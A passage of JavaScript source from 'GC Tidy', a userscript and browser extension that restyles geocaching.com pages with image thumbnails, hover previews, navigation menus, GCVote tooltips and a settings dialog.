					var sourceThumbnail = 'http://img.geocaching.com/cache/log/display/' + image.guid;
					var thumbnail = this.buildThumbnail(image, source, sourceThumbnail);
					thumbnail.appendTo(container);
				}, this));
			}, this));
			GCTidy.appendScript('text', 'jQuery(".gctidy-log-images .gctidy-thumbnail a:nth-child(1)").fancybox(' + this.getFancyboxOptions() + ');');
		},
		processTrackableImages: function(images) {
			if (!images.length) {
				return;
			}
			$('#ctl00_ContentBody_Images a.tb_images').removeAttr('rel');
			$('#ctl00_ContentBody_Images ul.imagelist').hide().before('<div id="gctidy-trackable-images" class="gctidy-shadow-thumbnails"></div>');
			var container = $('#gctidy-trackable-images');
			
			$.each(images, $.proxy(function(i, image) {
				var source = 'http://img.geocaching.com/track/' + image.guid;
				var sourceThumbnail = 'http://img.geocaching.com/track/display/' + image.guid;
				var thumbnail = this.buildThumbnail(image, source, sourceThumbnail);
				thumbnail.appendTo(container);
			}, this));
			GCTidy.appendScript('text', 'jQuery(".gctidy-thumbnail a").fancybox(' + this.getFancyboxOptions() + ');');
		},
		processTrackableMapLogImages: function(logs) {
			$.each(logs, $.proxy(function(i, log) {
				var container = $('<div class="gctidy-log-images gctidy-trackable-log-images"></div>');
				log.photos.hide().prev('br').hide();
				log.photos.after(container);
				
				$.each(log.images, $.proxy(function(j, image) {
					var source = 'http://img.geocaching.com/track/log/' + image.guid;
					var sourceThumbnail = 'http://img.geocaching.com/track/log/display/' + image.guid;
					image.rel = 'gctidy-trackable-image-group-' + i;
					var thumbnail = this.buildThumbnail(image, source, sourceThumbnail);
					thumbnail.appendTo(container);
				}, this));
			}, this));
			$('head').append('<link href="/css/fancybox/jquery.fancybox.css" rel="stylesheet" type="text/css">');
			var fancyBox = GCTidy.appendScript('src', 'http://www.geocaching.com/ScriptResource.axd?d=ehMRUa0gLkIKWOHe67JIG0CqSwuRDsD7nHDo4dRLnEA_Yl-AYm2WizrecL6T9kVEQMwiGi7U95s0LV8cb8QlilGeJIr04dyO_QvicCTn50ClUJA1_Y7Gw51lSGshu1wDX5wqDf-6mRTWbsrZDqc2taWfyaU1');
			$(fancyBox).load($.proxy(function() {
				GCTidy.appendScript('text', 'jQuery(".gctidy-thumbnail a").fancybox(' + this.getFancyboxOptions() + ');');
			}, this));
		},
		buildThumbnail: function(image, sourceImage, sourceThumbnail) {
			var thumbnail = $(
				'<div class="gctidy-image">' + 
					'<div class="gctidy-thumbnail">' + 
						'<a href="' + sourceImage + '" rel="' + image.rel + '">' +
							(image.spoiler ? '<div class="gctidy-spoiler">?</div>' : '<img src="' + sourceThumbnail + '">') +
						'</a>' + 
						(image.log ? '<a class="gctidy-log-url" href="' + image.log + '">View log</a>' : '') +
					'</div>' +
					'<p>' +
						'<a href="' + sourceImage + '">' + image.title + '</a>' + 
						(image.edit ? ' (<a href="' + image.edit + '" title="Edit image"><strong>Edit</strong></a>)' : '') + 
						(image.description ? '<br />' + image.description : '') + 
					'</p>' +
				'</div>'
			);
			thumbnail.find('a:first').attr('title', '' + image.title + '' + (image.description ? ' \n' + image.description : ''));
			return thumbnail;
		},
		getFancyboxOptions: function() {
			return '{' +
				'titlePosition: "inside",' +
				'overlayOpacity: 0.8,' +
				'titleFormat: function(title, anchors, i) {' +
					'var anchor = jQuery(anchors[i]);' +
					'var printPicture = "<a href=\\"" + anchor.attr("href") + "\\" target=\\"_blank\\">Print picture</a>";' +
					'var logUrl = anchor.next("a.gctidy-log-url").attr("href");' +
					'var viewLog = logUrl ? "<a href=\\"" + logUrl + "\\">View log</a>" : "";' +
					'return "<div class=\\"gctidy-print-picture\\">" + printPicture + viewLog + "</div>" + title.replace(/(.+?) \\n(.+)/, "$1<br /><span>$2</span>");' +
				'}' +
			'}';
		}
	},
	ImageTooltips: {
		PAGES: /^CacheDetailsPage|CacheGalleryPage|CacheViewLogPage|^TrackableDetailsPage|TrackableGalleryPage|TrackableMapPage|^ProfilePage/,
		META: {
			title: 'Image tooltips',
			description: 'Displays an image preview while hovering over image links/thumbnails'
		},
		STYLE: 
			'.gctidy-image-tooltip {position: absolute; z-index: 10; display: none; width: 400px; height: 400px;}' +
			'.gctidy-image-tooltip div {display: table-cell; width: 400px; height: 400px; vertical-align: bottom; text-align: center;}' +
			'.gctidy-image-tooltip.gctidy-flip div {vertical-align: top;}' +
			'.gctidy-image-tooltip img {max-width: 400px; max-height: 400px; -webkit-box-shadow: #000 2px 2px 8px; -webkit-border-radius: 5px; -moz-box-shadow: #000 2px 2px 8px; -moz-border-radius: 5px;}',
		process: function(page, pageType) {
			if (pageType == 'ProfilePage' && !$('#ctl00_ContentBody_ProfilePanel1_UserGallery_DataListGallery').length) {
				return;
			}
			
			var anchors, cacheLogsSelector;
			if (pageType.match(GCTidy.PageExtensions.ImageThumbnails.PAGES) && GCTidy.Settings.get('page_extension_ImageThumbnails')) {
				switch (pageType) {
					case 'CacheDetailsPage':
						anchors = $('.gctidy-thumbnail a');
						cacheLogsSelector = '.LogsTable .gctidy-thumbnail a';
						break;
					case 'TrackableDetailsPage':
						anchors = $(".gctidy-thumbnail a, ul.log_images a");
						break;
					case 'TrackableMapPage':
						anchors = $(".gctidy-thumbnail a");
						break;
				}
			}
			else {
				switch (pageType) {
					case 'ProfilePage':
						anchors = $('#ctl00_ContentBody_ProfilePanel1_UserGallery_DataListGallery a');
						break;
					case 'CacheDetailsPage':
						anchors = $('#ctl00_ContentBody_Images > a, .LogsTable table a');
						cacheLogsSelector = '.LogsTable table a';
						break;
					case 'TrackableDetailsPage':
						anchors = $("#ctl00_ContentBody_Images a.tb_images, ul.log_images a");
						break;
					case 'CacheGalleryPage':
					case 'TrackableGalleryPage':
						anchors = $('#ctl00_ContentBody_GalleryItems_DataListGallery a');
						break;
					case 'CacheViewLogPage':
						anchors = $('#ctl00_ContentBody_LogBookPanel1_GalleryList a');
						break;
					case 'TrackableMapPage':
						anchors = $("table a[href^='http://img.geocaching.com/track/log/']");
						break;
				}
			}
			this.processAnchors(anchors);
			
			if (pageType == 'CacheDetailsPage') {
				$(document).bind('GCTidyCacheLogsUpdate', $.proxy(function() {
					this.processAnchors($(cacheLogsSelector));
				}, this));
			}
		},
		processAnchors: function(anchors) {
			$.each(anchors, $.proxy(function(i, anchor) {
				this.addTooltip($(anchor));
			}, this));
		},
		addTooltip: function(anchor) {
			var tooltipSource = this.getTooltipSource(anchor);
			function buildTooltip() {
				var tooltip = $('<div class="gctidy-image-tooltip"><div><img src="' + tooltipSource + '"></div></div>');
				tooltip.appendTo('body');
				return tooltip;
			}
			function getPosition(tooltip) {
				var position;
				var offset = anchor.offset();
				if ((offset.top - 400 - 20) < 0) {
					anchor.css('display', 'inline-block');
					offset = anchor.offset();
					position = {
						left: offset.left + anchor.width() / 2 - 200 + 'px',
						top: offset.top + anchor.height() + 20 + 'px'
					};
					tooltip.addClass('gctidy-flip');
				}
				else {
					position = {
						left: offset.left + anchor.width() / 2 - 200 + 'px',
						top: offset.top - 400 - 20 + 'px'
					};
					tooltip.removeClass('gctidy-flip');
				}
				return position;
			}
			anchor.gctidyTooltip(buildTooltip,
				{
					getPosition: getPosition,
					delay: 500,
					fadeIn: 150,
					fadeOut: 100,
					hideOnClick: true
				}
			);
		},
		getTooltipSource: function(anchor) {
			var source = anchor.attr('href');
			var sourceTooltip;
			if (source.match('/(track|cache)/log/(?!display)')) {
				sourceTooltip = source.replace('/log/', '/log/display/');
			}
			else if (source.match('/cache/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\.jpg')) {
				sourceTooltip = source;
			}
			else if (source.match('/track/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\.jpg')) {
				sourceTooltip = source.replace('/track/', '/track/display/');
			}
			else if (anchor.find('img').length) {
				sourceTooltip = anchor.find('img').attr('src').replace('/thumb/', '/display/');
			}
			else {
				sourceTooltip = source;
			}
			return sourceTooltip;
		}
	},
	UserNavigation: {
		PAGES: /^(?!PrintCacheDetailsPage).*/,
		NO_IFRAME_PROCESSING: true,
		META: {
			title: 'User navigation',
			description: 'Displays a shortcut navigation in the top right corner while hovering over your username'
		},
		STYLE:
			'#gctidy-user-navigation-container {float: right; width: 0; height: 0; position: relative;}' +
			'#gctidy-user-navigation {display: none; position: absolute; padding: 1em 1.5em 1.2em 1.3em; background: #7a7a7a; text-align: left; white-space: nowrap; color: #CDD8E8; z-index: 1001; -webkit-border-bottom-left-radius: 6px; -moz-border-radius-bottomleft: 6px; -webkit-box-shadow: rgba(0,0,0,0.4) -1px 2px 4px; -moz-box-shadow: rgba(0,0,0,0.4) -1px 3px 5px;}' +
			'#gctidy-user-navigation small {font-weight: bold; font-size: 80%; color: white; margin-top: 2px;}' +
			'#gctidy-user-navigation a {color: #CDD8E8 !important; text-decoration: none;}' +
			'#gctidy-user-navigation a:visited {color: #CDD8E8;}' +
			'#gctidy-user-navigation a:hover {color: #CDD8E8 !important; text-decoration: underline;}' +
			'#gctidy-user-navigation .gctidy-left, #gctidy-user-navigation .gctidy-right {display: inline-block; vertical-align: top;}' +
			'#gctidy-user-navigation .gctidy-left {margin-right: 1.2em; padding-right: 1.3em; border-right: 1px solid #888;}' +
			'',
		process: function(page, pageType) {
			var header = $('#hd');
			var mouseover = header.find('.yui-u:eq(1)').css({width: 'auto', margin: '-0.5em 0', padding: '0.5em 0'});

			var homeCoordinates = GCTidy.Settings.get('home_coordinates');
			var basicMember = GCTidy.Settings.get('basic_member');
			var userGuid = GCTidy.Settings.get('user_guid');
			
			var container = $('<div id="gctidy-user-navigation-container"></div>').prependTo('#bd');
			var navigation = $('<div id="gctidy-user-navigation"></div>').appendTo(container);
			
			var left = $('<div class="gctidy-left"></div>').appendTo(navigation);
			if (homeCoordinates) {
				left.append(
					'<small>Search</small><br />' +
					'<a href="/seek/nearest.aspx?' + homeCoordinates + '">Geocaches</a> (<a href="/seek/nearest.aspx?' + homeCoordinates + '&f=1">&ndash;&thinsp;Finds</a>)<br />' +
					'<a href="/map/default.aspx?' + homeCoordinates + '">Maps</a><br />' +
					'<a href="/mark/nearest.aspx?' + homeCoordinates.replace(/lng/, 'lon') + '">Benchmarks</a><br />' +
					'<br />'
				);
			}
			left.append(
					'<small>Trackables</small><br />' +
					'<a href="/my/inventory.aspx">Inventory</a><br />' +
					'<a href="/my/collection.aspx">Collection</a><br />' +
					'<br />' +
					'<small>Logs</small><br />' +
					'<a href="/my/geocaches.aspx">Geocaches</a> (<a href="/my/owned.aspx">Yours</a>)<br />' +
					'<a href="/my/travelbugs.aspx">Trackables</a>' + (userGuid ? ' (<a href="/track/search.aspx?o=1&uid=' + userGuid + '&f=1">Yours</a>)' : '') + '<br />' +
					'<a href="/my/benchmarks.aspx">Benchmarks</a>'
			);

			var right = $('<div class="gctidy-right"></div>').appendTo(navigation);
			right.append(
					'<small>Lists</small><br />' +
					'<a href="/my/watchlist.aspx">Watchlist</a><br />' +
					'<a href="/my/fieldnotes.aspx">Fieldnotes</a> (<a href="/my/uploadfieldnotes.aspx">Upload</a>)<br />' +
					(basicMember ? '' : '<a href="/my/favorites.aspx">Favorites</a><br />') +
					'<br />'
				);
			if (!basicMember) {
				right.append(
					'<small>Premium features</small><br />' +
					'<a href="/bookmarks/default.aspx">Bookmarks</a><br />' +
					'<a href="/pocket/default.aspx">Pocket queries</a><br />' +
					'<a href="/pocket/saved.aspx">Saved GPX files</a><br />' +
					'<a href="/my/userroutes.aspx">Routes</a><br />' +
					'<a href="/notify/default.aspx">Notifications</a><br />' +
					'<br />'
				);
			}
			right.append(
				'<a href="/my/myfriends.aspx">Friends</a><br />' +
				'<a href="/my/statistics.aspx">Statistics</a><br />' +
				'<a href="/profile/">Public profile</a><br />' +
				'<a href="/account/default.aspx">Account details</a><br />'
			);
			
			mouseover.gctidyTooltip(
				navigation, 
				{
					fadeIn: 50,
					fadeOut: 50,
					delay: 300,
					tooltipHover: true,
					getPosition: function() {
						return {right: 0, top: 0};
					}
				}
			);
		}
	},
	ProfileNavigation: {
		PAGES: /^Your.*/,
		META: {
			title: 'Alternative profile navigation',
			description: 'Rearranges the profile navigation bar'
		},
		STYLE:
			'#gctidy-profile-navigation {margin: -1.11em 0em -3.06em 0; overflow: hidden; float:right;}' +
			'#gctidy-profile-navigation div {float: left; margin: 0 0 0 1em;}' +
			'#gctidy-profile-navigation span {font-size: 72%; color: #7A7A7A; line-height: 1.6; }' +
			'#gctidy-profile-navigation a.gctidy-active {color: black; font-weight: bold; text-decoration: none;}' +
			'#gctidy-profile-navigation a.gctidy-active:visited {color: black;}' +
			'#gctidy-profile-navigation a:visited {color: #039;}' +
			'.BreadcrumbsWidget {margin-bottom: -2em;}' +
			'',
		process: function(page, pageType) {
			var old = $('#Content .yui-g:eq(1) p:first').hide();
			var yourTrackables = old.find('a[href^="/track/search.aspx"]').attr('href');
			
			var navigation = $(
				'<div id="gctidy-profile-navigation">' +
					'<div>' +
						'<span><br /></span>' +
						'<a id="gctidy-YourProfilePage" href="/my/default.aspx">Quick View</a><br />' +
						'<a id="gctidy-YourStatisticsPage" href="/my/statistics.aspx">Statistics</a>' +
					'</div>' +
					'<div>' +
						'<span>Lists<br /></span>' +
						'<a id="gctidy-YourWatchlistPage" href="/my/watchlist.aspx">Watchlist</a><br />' +
						'<a id="gctidy-YourFieldNotesPage" href="/my/fieldnotes.aspx">Field notes</a><br />' +
						(GCTidy.Settings.get('basic_member') ? '' : '<a id="gctidy-YourFavoritesPage" href="/my/favorites.aspx">Favorites</a><br />') +
						//($('#memberStatus:contains("Basic Member")').length ? '' : '<a href="/bookmarks/default.aspx">Bookmarks</a>') +
					'</div>' +
					'<div>' +
						'<span>Logs<br /></span>' +
						'<a id="gctidy-YourCacheLogsPage" href="/my/geocaches.aspx">Geocaches</a> (<a id="gctidy-YourOwnCachesPage" href="/my/owned.aspx">Yours</a>)<br />' +
						'<a id="gctidy-YourTrackableLogsPage" href="/my/travelbugs.aspx">Trackables</a>' + (yourTrackables ? ' (<a href="' + yourTrackables + '">Yours</a>)' : '') + '<br />' +
						'<a id="gctidy-YourBenchmarkLogsPage" href="/my/benchmarks.aspx">Benchmarks</a>' +
					'</div>' +
					'<div>' +
						'<span>Trackables<br /></span>' +
						'<a id="gctidy-YourTrackablesInventoryPage" href="/my/inventory.aspx">Inventory</a><br />' +
						'<a id="gctidy-YourTrackablesCollectionPage" href="/my/collection.aspx">Collection</a><br />' +
					'</div>' +
					'<div>' +
						'<span><br /></span>' +
						'<a id="gctidy-YourFriendsPage" href="/my/myfriends.aspx">Friends</a><br />' +
						'<a id="gctidy-YourSouvenirsPage" href="/my/souvenirs.aspx">Souvenirs</a><br />' +
						'<a id="gctidy-YourAccountDetailsPage" href="/account/default.aspx">Account Details</a><br />' +
					'</div>' +
				'</div>'
			).prependTo('#Content .yui-g:eq(0)');

			$('#gctidy-' + pageType).addClass('gctidy-active');
			
			switch (pageType) {
				case 'YourWatchlistPage':
					var emptyP = $('#Content .yui-g:eq(1) h2:first').next('p');
					if (emptyP.html() == '&nbsp;&nbsp;') {
						emptyP.remove();
					}
					break;
				case 'YourFieldNotesPage':
					old.show();
					break;
				case 'YourOwnCachesPage':
					$('#Content .yui-g:eq(1) h2:first').prev('br').remove();
					break;
			}
		}
	},
	GCVoteDetails: {
		PAGES: /^CacheDetailsPage|CachePostLogPage|CacheViewLogPage|CacheSearchResultsPage|YourProfilePage|YourWatchlistPage|YourLogsPage|YourCacheLogsPage/,
		STYLE: 
			'.gctidy-gcvote-details {display: none; visibility: visible !important; background: white !important; -webkit-border-radius: 6px; -webkit-box-shadow: rgba(0,0,0,0.5) 1px -1px 10px; -moz-box-shadow: rgba(0,0,0,0.5) 1px -1px 10px; -moz-border-radius: 6px; border-spacing: 0; border-width:0px !important; font-size: 80%;}' +
			'.gctidy-gcvote-details tr:nth-child(1) td {padding: 0.5em 0.7em 0.5em 0.95em !important; background-color: #ffffaa; -webkit-border-top-left-radius: 6px; -webkit-border-top-right-radius: 6px; -moz-border-radius-topleft: 6px; -moz-border-radius-topright: 6px;}' +
			'.gctidy-gcvote-details tr:nth-child(2) td {padding: 0em 1em 0.4em !important; background-color: transparent !important;}' +
			'table.SearchResultsTable tr.Data td .gctidy-gcvote-details td {border-left: 0px solid white !important; border-right-width: 0 !important; }' +
			'',
		process: function(page, pageType, doc) {
			doc = $(doc);

			function processTooltip(tooltip) {
				tooltip.addClass('gctidy-gcvote-details');
				var anchor = tooltip.parent();
				anchor.css('cursor', 'pointer');
				anchor.gctidyTooltip(tooltip, {
					delay: 400,
					fadeIn: 100,
					fadeOut: 100,
					getPosition: function() {
						var offset = anchor.offset();
						var left = offset.left + anchor.width() / 2 - tooltip.width() / 2;
						var top = offset.top - tooltip.outerHeight() - 5;
						switch (pageType) {
							case 'CacheSearchResultsPage':
								left = Math.min(left, doc.find('body').outerWidth() - tooltip.width() - 16);
								break;
							case 'CachePostLogPage':
								if (doc.find('body').hasClass('gctidy-inside-iframe') && offset.left > tooltip.outerWidth()) {
									top = offset.top - tooltip.outerHeight() / 2 + 14;
									left = offset.left - tooltip.outerWidth() - 10;
								}
								else {
									left = Math.max(left, doc.find('body').offset().left + 4);
								}
								break;
						}
						return {left: left + 'px', top: top + 'px'};
					}
				});
			}
			
			function onGCVote(event) {
				var tooltip = $(event.target).find('table[id^="gcvoteDetails"]');
				if (tooltip.length && !tooltip.hasClass('gctidy-gcvote-details')) {
					processTooltip(tooltip);
				}
			}
			function onGCVoteSingle(event) {
				if (event.target.nodeName == 'SPAN' || event.target.nodeName == 'TD') {
					onGCVote(event);
				}
			}
			function onGCVoteList(event) {
				if (event.target.nodeName == 'DIV') {
					onGCVote(event);
				}
			}

			var tooltips = doc.find('table[id^="gcvoteDetails"]');
			if (tooltips.length) {
				tooltips.each(function() {
					processTooltip($(this));
				});
			}
			else {
				switch (pageType) {
					case 'CacheDetailsPage':
						//doc.find('#ctl00_ContentBody_CacheName').parent('h2').next('table').find('tr:eq(1)').bind('DOMNodeInserted', onGCVoteSingle);
						//doc.find('#ctl00_ContentBody_CacheName').parent('h2').parent('td').find('table:first tr:eq(1)').bind('DOMNodeInserted', onGCVoteSingle);
						doc.find('#ctl00_ContentBody_CacheName').closest('table').next('table').find('tr:eq(0)').bind('DOMNodeInserted', onGCVoteSingle);
						break;
					case 'CachePostLogPage':
					case 'CacheViewLogPage':
						doc.find('#ctl00_ContentBody_LogBookPanel1_ViewLogPanel, #ctl00_ContentBody_LogBookPanel1_EditLogPanel').bind('DOMNodeInserted', onGCVoteSingle);
						break;
					case 'CacheSearchResultsPage':
						doc.find('#ctl00_ContentBody_dlResults').bind('DOMNodeInserted', onGCVoteList);
						break;
					case 'YourProfilePage':
					case 'YourCacheLogsPage':
						doc.find('#Content .yui-u.first > table').bind('DOMNodeInserted', onGCVoteList);
						break;
					case 'YourWatchlistPage':
					case 'YourLogsPage':
						doc.find('#Content .yui-g > table').bind('DOMNodeInserted', onGCVoteList);
						break;
				}
			}
		}
	},
	Configuration: {
		PAGES: /^(?!PrintCacheDetailsPage).*/,
		NO_IFRAME_PROCESSING: true,
		STYLE:
			'#gctidy-open-configuration {margin-left: 0em; color: #CDD8E8; font-family: Arial, sans-serif; cursor: pointer;}' +
			'#gctidy-open-configuration strong {font-family: "Arial Narrow", Arial, sans-serif; margin-left: 1px;}' +
			'#gctidy-open-configuration:hover {text-decoration: underline;}' +
			'#gctidy-configuration {padding: 8px; text-align: left; background: rgba(100, 100, 100, 0.5); -webkit-border-radius: 6px; -moz-border-radius: 6px;}' +
			'#gctidy-configuration-content {background: white; width: 450px; border: 1px solid #777;}' +
			'#gctidy-configuration h1 {background: #38b65a; color: white; font-size: 132%; padding: 8px 10px 8px; font-family: Arial, Helvetica, sans-serif; font-weight: normal;}' +
			'#gctidy-configuration h1 strong {font-family: "Arial Narrow", Arial, sans-serif; margin-left: 1px;}' +
			'#gctidy-configuration ul {line-height: 1.5; }' +
			'#gctidy-configuration label {font-weight: normal; margin-left: 0.2em; }' +
			'.gctidy-tabs {background: #f0f0f0; border-bottom: 1px solid #ccc; padding: 0.4em 0.75em 0;}' +
			'.gctidy-tabs:after {content: "."; display: block; clear: both; height: 0; font-size: 0px; line-height: 0; visibility: hidden;}' +
			'.gctidy-tabs li {float: left; margin: 0 0.3em -1px; border: 1px solid #f0f0f0; border-bottom: 1px solid #ccc;}' +
			'.gctidy-tabs li.gctidy-tab-selected {background: white; border: 1px solid #ccc; border-bottom: 1px solid white;}' +
			'.gctidy-tabs a {text-decoration: none; display: block; padding: 0.4em 0.9em 0.45em; font-size: 95%;}' +
			'.gctidy-tabs a:hover {text-decoration: underline;}' +
			'.gctidy-tabs a, .gctidy-tabs a:visited {color: #039;}' +
			'.gctidy-tab-selected a, .gctidy-tab-selected a:visited {color: #444;}' +
			'.gctidy-tab-pane {padding: 1.7em 1em 1.7em 1.9em;  font-size: 95%;}' +
			'.gctidy-tab-pane p:first-child {margin: 0;}' +
			'#gctidy-tab-pages p:first-child, #gctidy-tab-page-extensions p:first-child {margin: 0 0 0.5em; color: #555; font-size: 95%;}' +
			'.gctidy-tab-pane p.gctidy-description {margin: -0.1em 0 0 1.9em; font-size: 80%; color: #999;}' +
			'.gctidy-tab-pane a, .gctidy-tab-pane a:visited {color: #039;}' +
			'.gctidy-tab-pane a:hover {color: #F60;}' +
			'.gctidy-tab-pane li {margin: 0.3em 0 0;}' +
			'.gctidy-tab-pane ul ul {margin: 0.3em 0 0 1.5em; padding:0.4em 1em 0.6em; background: #f4f4f4; font-size:100%; display: none;}' +
			'.gctidy-tab-pane ul li.gctidy-opened ul {display: block;}' +
			'.gctidy-tab-pane ul li span {font-size:84%;}' +
			'.gctidy-tab-pane li .gctidy-hide-options {display: none;}' +
			'.gctidy-tab-pane li.gctidy-opened .gctidy-show-options {display: none;}' +
			'.gctidy-tab-pane li.gctidy-opened .gctidy-hide-options {display: inline;}' +
			'.gctidy-buttons {background: #f0f0f0; border-top: 1px solid #ccc; padding: 0.75em 0.75em; text-align: right;}' +
			'.gctidy-buttons input {margin-left: 0.5em;}' +
			'',
		process: function(page, pageType) {
			var span = $('<span id="gctidy-open-configuration" title="GC Tidy Configuration">GC<strong>Tidy</strong></span>');
			span.appendTo('#hd h1').before(' - ');
			span.click($.proxy(function() {
				this.build(pageType);
			}, this));
		},
		build: function(currentPageType) {
			var panel = $('<div id="gctidy-configuration"></div>');
			var content = $('<div id="gctidy-configuration-content"></div>')
				.appendTo(panel);
			$('<h1>GC<strong>Tidy</strong></h1>')
				.appendTo(content)
				.find('strong').dblclick(this.zapp);
			$('<ul class="gctidy-tabs"></ul>')
				.append('<li><a href="#gctidy-tab-pages">Pages</a></li>')
				.append('<li><a href="#gctidy-tab-page-extensions">Extensions</a></li>')
				.append('<li><a href="#gctidy-tab-about">About</a></li>')
				.appendTo(content);
				
			// Pages
			var panePages = $('<div id="gctidy-tab-pages" class="gctidy-tab-pane"></div>')
				.append('<p><strong>Select the pages to tidy up:</strong></p>')
				.appendTo(content);
			var listPages = $('<ul></ul>')
				.appendTo(panePages);
			$.each(GCTidy.Pages, function(pageType, page) {
				if (!page.META) {
					return;
				}
				var id = 'page_' + pageType;
				var listItem = $('<li></li>')
					.toggleClass('gctidy-opened', currentPageType == pageType)
					.append('<input type="checkbox" name="' + id + '" id="' + id + '"' + (GCTidy.Settings.get(id) ? ' checked="checked"' : '') + '>')
					.append('<label for="' + id + '">' + page.META.title + '</label>')
					.appendTo(listPages);
					
				// Page options
				if (page.OPTIONS) {
					$('<span> (<a class="gctidy-show-options" href="#">Show Options</a><a class="gctidy-hide-options" href="#">Hide Options</a>)</span>')
						.appendTo(listItem)
						.find('a').click(function() {
							listItem.toggleClass('gctidy-opened');
							return false;
						});
					var listOptions = $('<ul></ul>')
						.appendTo(listItem);
					$.each(page.OPTIONS, function() {
						var id = 'page_' + pageType + '_' + this.name;
						$('<li></li>')
							.append('<input type="checkbox" name="' + id + '" id="' + id + '"' + (GCTidy.Settings.get(id) ? ' checked="checked"' : '') + '>')
							.append('<label for="' + id + '">' + this.title + '</label>')
							.appendTo(listOptions);
					});
				}
			});
			
			// Page extensions
			var panePageExtensions = $('<div id="gctidy-tab-page-extensions" class="gctidy-tab-pane"></div>')
				.append('<p><strong>Select the extensions that you want to provide additional functionality:</strong></p>')
				.appendTo(content);
			var listPageExtensions = $('<ul></ul>')
				.appendTo(panePageExtensions);
			$.each(GCTidy.PageExtensions, function(name, pageExtension) {
				if (!pageExtension.META || !pageExtension.META.title) {
					return;
				}
				var id = 'page_extension_' + name;
				$('<li></li>')
					.append('<input type="checkbox" name="' + id + '" id="' + id + '"' + (GCTidy.Settings.get(id) ? ' checked="checked"' : '') + '>')
					.append('<label for="' + id + '">' + pageExtension.META.title + '</label>')
					.append(pageExtension.META.description ? '<p class="gctidy-description">' + pageExtension.META.description + '</p>' : '')
					.appendTo(listPageExtensions);
			});
			
			// About
			var paneAbout = $('<div id="gctidy-tab-about" class="gctidy-tab-pane"></div>')
				.appendTo(content);
			var scriptType = {
				greasemonkey: 'Greasemonkey Script', 
				chrome: 'Google Chrome Extension', 
				safari: 'Safari Extension', 
				document: 'Glimmerblocker Filter'
			};
			var scriptHomepage = {
				greasemonkey: ' (<a href="' + GCTidy.USERSCRIPTS_EXTENSION_URL + '" target="_blank">Script Homepage</a>)', 
				chrome: ' (<a href="' + GCTidy.CHROME_EXTENSION_URL + '" target="_blank">Extension Homepage</a>)', 
				safari: ' (<a href="' + GCTidy.SAFARI_EXTENSION_URL + '" target="_blank">Extension Homepage</a>)', 
				document: ''
			};
			$('<p></p>')
				.append('GC Tidy ' + scriptType[ENVIRONMENT] + scriptHomepage[ENVIRONMENT] + '<br />')
				.append('Version ' + GCTidy.VERSION + '<br />')
				.append('Author: <a href="mailto:tenrapid@gmx.de">tenrapid@gmx.de</a>')
				.appendTo(paneAbout);
			switch (ENVIRONMENT) {
				case 'greasemonkey':
					$('<p>Last update check: ' + (new Date(GCTidy.Settings.get('last_update_check'))) + '</p>').appendTo(paneAbout);
					break;
			}
			
			// Buttons
			$('<div class="gctidy-buttons"></div>')
				.append('<input class="gctidy-close-configuration" type="button" value="Save">')
				.append('<input class="gctidy-close-configuration" type="button" value="Cancel">')
				.appendTo(content);
			
			panel.find("input[value='Save']").click($.proxy(this.save, this));
			panel.lightbox_me({
				overlayCSS: {background: '#999', opacity: 0.3},
				modalCSS: {top: '100px'},
				closeSelector: '.gctidy-close-configuration',
				destroyOnClose: true
			});
			panel.find('.gctidy-tabs').gctidyTabs();
		},
		save: function() {
			$('#gctidy-configuration .gctidy-tab-pane input').each(function() {
				var checkbox = $(this);
				GCTidy.Settings.set(checkbox.attr('name'), checkbox.attr('checked'));
			});
		},
		zapp: function() {
			zapp = !zapp;
			GCTidy.Settings.set('zapp', zapp);
			$('<span style="float: right;">' + (zapp ? ':)' : ':(') + '</span>')
				.prependTo('#gctidy-configuration h1')
				.fadeOut(1000, function() {
					$('#gctidy-configuration h1 span').remove();
				});
		}
	}
};

GCTidy.IMAGES = {
	mapIcon: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAK2SURBVBgZBcHLjxN1AADg79eZttvddttll+WxIGrAV4QYTbxoYsSLgjc5arx68qCGf8G7J+NBEg8e9GqURDEmEiOJAWNUwIi8sryWDbSdmc60Mx2/Lxw78caZ1fXVo1EUAYAAACAIgICymrt/7/6P8er66tHPPzklNIJyPgNAENRqAWSzBEFdN9TzWq3y0ckPj8ZRFKmUwuxL6fcXrJzJbJ18xFKv6/LlX1xMP3Nra6jXW3Z3eyiKm0Zp7t1jtWYcaQAMh9uGT7eMkkR2+m9JcluSJEJxQTEZm2Rj00liMkmUeSqEOYI4APr9ndQzi+/v4OPz2m+tWd+zV2d2xaQ8pDfoaUUNcbMlyXIhFAgaQDAcDiXJ2MP1ymilNPn6X6q5OvvZrEhk49SsyBR5alpkQqhBDNDvr1PPDPrLhu89Y+XTbeUre7TXCo9MtzW7+y22I81W0zibYkSgQQB5XkiTzHA0NF6qPHiC/Iv/1FWuMf1WPklMi1SeJubTVABBHACdzkB3OdVfXgbNtx/V+eCsuDpg7+pf8s7ERvcP7daW6eSaqPGOgDgAxsNUkhRI/bZ5x41Zw66DlSdPXbZ5PLUr+kYx+slg8Yj2uW1hNRPQEIKA5cFuFgZ+z0rXpk2DwU53XjtgX7xisrXXoDuycX1B54dLbrQqdbMFYqjr2rmbV13YvKTb7cnzXJKkkqLw61MNh7+6Ijl/3eZK0+3nHzdqBvtbbRAHZGVqq5ppt7qWOn15MdVd6Or/ed2+W5lWkwfPHnbzsZZ2e8HStKCuQUwQQkPPsknItKuOxdC16+I9rc2Jqy8dURxMvHz2oX/27xa1m5irZqWAuCwrVVXZ2PGcjVUCCMIhvMpaCCC8OPdCNBMttESNSDWvlFUlvHni+Hc719dej5oxggAIAAAIAIGyrGzd3Tr9P5JrNp8Zt4rCAAAAAElFTkSuQmCC',
